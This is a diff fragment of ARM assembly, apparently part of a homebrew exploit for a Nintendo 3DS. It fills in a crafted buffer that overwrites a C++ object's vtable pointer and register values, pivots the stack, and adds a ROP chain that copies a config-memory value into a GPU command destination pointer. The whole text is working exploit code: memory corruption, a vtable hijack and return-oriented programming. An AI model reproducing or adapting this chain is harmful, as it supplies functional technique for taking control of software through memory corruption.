@@ -32,18 +32,18 @@ additionaldata_start:
 .word 0x18A0 @ additionaldata+0xc, u32 size1
 .word 0xffffffff @ additionaldata+0x10. The data used with size0 for the memcpy begins here. The data used with the memcpy for size1 is located immediately after this block.
 .word ADDITIONALDATA_ADR+0x24 @ additionaldata+0x14. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0x24>. (r0)
-.word 0xffffffff @ additionaldata+0x18 / object+0x4. (r1)
+.word 0x1FF80040 @ additionaldata+0x18 / object+0x4. (r1)
 .word 0xffffffff @ r2
-.word 0xffffffff @ r3
-.word 0xffffffff @ r4
-.word 0xffffffff @ r5
+.word TEXT_APPMEM_OFFSET + 0xD0000000 @ r3
+.word 0xffffffff @ r4 (additonaldata+0x24)
+.word GXLOWCMD4_DSTADR_PTR @ r5 (address used with the "ldr r1, [r5]" by ROP_LDRR1R5_MOVR0R8_BLXR7, before the GXLOW_CMD4 call)
 .word 0xffffffff @ r6
-.word 0xffffffff @ r7
-.word 0xffffffff @ r8
+.word POP_LRPC @ r7 (jump-addr used with ROP_LDRR1R5_MOVR0R8_BLXR7 before the GXLOW_CMD4 call)
+.word TMPBUF_ADR @ r8 (later moved into r0 before the GXLOW_CMD4 call, via ROP_LDRR1R5_MOVR0R8_BLXR7)
 .word 0xffffffff @ r9
 .word 0xffffffff @ sl
 .word 0xffffffff @ fp
-.word 0xffffffff @ ip
+.word ROP_LDRR2R0_SUBR1R2R1_STRR1R0 @ ip
 .word (ropstackstart-additionaldata_start) + ADDITIONALDATA_ADR @ sp
 .word POP_PC @ lr
 .word POP_PC @ pc
@@ -52,6 +52,13 @@ additionaldata_start:
 
 @ Stack begins here. Once the stack-pivot finishes, sp will be set to here, and "pop {pc}" will be executed.
 ropstackstart:
+.word POP_R0PC
+.word GXLOWCMD4_DSTADR_PTR
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy u32 *0x1FF80040(configmem APPMEMALLOC) to GXLOWCMD4_DSTADR_PTR.
+
+.word ROP_MOVR1R3_BXIP @ r1 = r3, then jump to ROP_LDRR2R0_SUBR1R2R1_STRR1R0.
+
 .word POP_R0R4SLIPPC
 .word BEACONDATA_ADR @ r0, outbuf
 .word 0x600 @ r1, size
